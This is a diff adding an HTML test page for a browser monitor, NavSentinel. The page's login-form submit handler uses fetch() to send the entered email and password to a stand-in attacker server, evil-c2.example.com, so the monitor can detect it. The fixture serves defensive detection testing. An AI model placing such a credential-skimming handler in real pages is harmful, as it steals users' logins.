@@ -1,0 +1,63 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>JS Behavior 03 - Fetch Exfiltration During Submit</title>
+  <style>
+    body { font-family: sans-serif; padding: 24px; background: #f5f5f5; }
+    h1 { margin-top: 0; }
+    .description { background: #fff3cd; border: 1px solid #ffc107; padding: 12px; border-radius: 4px; margin-bottom: 20px; }
+    form { background: #fff; padding: 20px; border-radius: 8px; border: 1px solid #ddd; max-width: 400px; }
+    label { display: block; margin-bottom: 12px; }
+    input { width: 200px; padding: 4px; }
+    #status { margin-top: 16px; padding: 8px 12px; border-radius: 4px; font-size: 14px; background: #d4edda; }
+    #log { margin-top: 12px; font-family: monospace; font-size: 12px; white-space: pre-wrap; background: #eee; padding: 8px; border-radius: 4px; }
+  </style>
+</head>
+<body>
+  <h1>JS Behavior 03 - Fetch Exfiltration During Submit</h1>
+  <div class="description">
+    <strong>Attack scenario:</strong> A form submit handler uses <code>fetch()</code> to
+    exfiltrate credentials to a third-party server before (or instead of) the normal submission.
+    <br><br>
+    <strong>Expected:</strong> NavSentinel JS behavior monitor detects the cross-origin
+    fetch within the form submit correlation window and fires
+    <code>ns-js-exfil-network</code> with api="fetch".
+  </div>
+
+  <form id="login-form" action="/api/login" method="POST">
+    <h3>Secure Sign In</h3>
+    <label>Email: <input type="email" name="email" value="victim@corp.com" /></label>
+    <label>Password: <input type="password" name="password" value="s3cr3t" /></label>
+    <button type="submit" id="submit-btn">Sign In</button>
+  </form>
+
+  <div id="status">Status: Waiting for form submit...</div>
+  <div id="log"></div>
+
+  <script>
+    var log = document.getElementById("log");
+    function appendLog(msg) { log.textContent += msg + "\n"; }
+
+    document.getElementById("login-form").addEventListener("submit", function(e) {
+      e.preventDefault();
+      appendLog("[*] Form submitted, exfiltrating via fetch...");
+
+      var email = document.querySelector('input[name="email"]').value;
+      var pass = document.querySelector('input[name="password"]').value;
+
+      fetch("https://evil-c2.example.com/collect", {
+        method: "POST",
+        body: JSON.stringify({ email: email, password: pass }),
+        headers: { "Content-Type": "application/json" }
+      }).catch(function() {
+        appendLog("[*] Fetch blocked by CORS (expected in demo), but monitor still sees it.");
+      });
+
+      document.getElementById("status").textContent =
+        "Status: fetch() to evil-c2.example.com fired. NavSentinel should detect exfil.";
+      appendLog("[*] ns-js-exfil-network signal expected with api='fetch'");
+    });
+  </script>
+</body>
+</html>
